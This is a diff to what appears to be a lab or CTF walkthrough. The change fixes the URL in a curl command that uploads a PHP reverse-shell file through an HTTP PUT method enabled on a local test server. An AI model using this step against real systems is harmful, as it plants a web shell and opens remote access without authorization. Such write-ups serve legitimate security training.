@@ -34,7 +34,7 @@ curl -I -X OPTIONS http://192.168.1.3/test
 Here we have the PUT method enabled, so lets use the `--file-upload` switch in curl to upload a reverse-shell file to the test directory.
 (make changes to your ip and port in the php-reverse-shell.php code)
 ```bash
-curl --upload-file /tmp/php-reverse-shell.php <http://192.168.1.3/test/shell.php>
+curl --upload-file /tmp/php-reverse-shell.php http://192.168.1.3/test/shell.php
 ```
 <img width="1213" height="652" alt="image" src="https://github.com/user-attachments/assets/4cd96021-61b9-410f-8829-b3331a7b2806" />
 
